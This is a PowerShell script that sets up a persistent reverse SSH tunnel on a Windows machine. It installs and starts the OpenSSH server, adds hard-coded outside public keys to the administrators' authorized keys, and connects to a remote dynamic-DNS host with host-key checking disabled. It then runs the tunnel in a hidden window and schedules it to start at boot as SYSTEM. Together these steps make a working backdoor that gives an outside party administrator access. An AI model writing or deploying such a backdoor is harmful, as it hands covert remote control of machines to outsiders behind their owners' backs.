# This script must be executed with powershell running as administrator

# Ensure OpenSSH Client and Server are installed
$opensshClient = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Client*'
$opensshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'

if ($opensshClient.State -ne "Installed") {
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
}
if ($opensshServer.State -ne "Installed") {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
}

# Start and enable sshd
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Configure the firewall
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' `
        -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
}

# Prepare SSH key path
$sshDir = "$env:USERPROFILE\.ssh"
$keyFile = "$sshDir\$($env:USERNAME)_ed25519"
$pubKeyFile = "$keyFile.pub"
$user = "nobody1"
$remote_host = "edcoretecmm.sytes.net"
$receivedPort = 2004
$logFile = "$env:USERPROFILE\Other\rev_ssh.log"
$batFilePath = "$env:USERPROFILE\Other\rev_ssh.bat"

# Create Other directory if not exists
$otherDir = "$env:USERPROFILE\Other"
if (-not (Test-Path $otherDir)) {
    mkdir $otherDir -Force | Out-Null
}

# Create SSH key pair if not exists
if (-not (Test-Path $keyFile)) {
    mkdir $sshDir -Force | Out-Null
    #ssh-keygen -t ed25519 -f $keyFile -N ""
	Start-Process -FilePath "ssh-keygen" -ArgumentList "-t ed25519 -f `"$keyFile`" -N `""" -q" -Wait
}

# Add remote public key to localhost
$nobody1_public = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfWGblM3hG4bwrALVaC0mWhnzdPeolZjUAvd0l6Eolk nobody1@z6yg5ybv"
$nobody2_public = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz nobody2@z6yg5ybv"

# Ensure the SSH directory exists in ProgramData
$adminAuthKeysPath = "$env:ProgramData\ssh\administrators_authorized_keys"
if (-not (Test-Path "$env:ProgramData\ssh")) {
    mkdir "$env:ProgramData\ssh" -Force | Out-Null
}

# Add the correct public key based on $user
if ($user -eq "nobody1") {
    Add-Content -Path $adminAuthKeysPath -Value $nobody1_public
} elseif ($user -eq "nobody2") {
    Add-Content -Path $adminAuthKeysPath -Value $nobody2_public
} else {
    Write-Output "Unknown user: $user. No key added."
    exit 1
}

# Set correct permissions
icacls.exe "C:\ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F"

# Add public key to remote server
$publicKey = Get-Content $pubKeyFile -Raw
ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# Create the batch content with properly escaped quotes
$batContent = @"
@echo off
echo [INFO] Starting reverse SSH tunnel at %date% %time% >> "$logFile"
timeout /t 10 /nobreak > nul
ssh -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -R ${receivedPort}:localhost:22 ${user}@${remote_host} >> "$logFile" 2>&1
"@

# Save the batch file
Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII

# Run the reverse tunnel .bat file now (optional: comment out if you don't want it to start immediately)
Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
#Start-Process -FilePath "$batFilePath"

# Schedule task to run the .bat file at startup with highest privileges
$taskName = "ReverseSSHTunnel"
try {
    schtasks /query /tn $taskName 2>$null
    $taskExists = $true
} catch {
    $taskExists = $false
}

if (-not $taskExists) {
    schtasks /create /tn $taskName `
        /tr "`"$batFilePath`"" `
        /sc onstart `
        /rl HIGHEST `
        /f `
        /ru "SYSTEM"
}

#Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
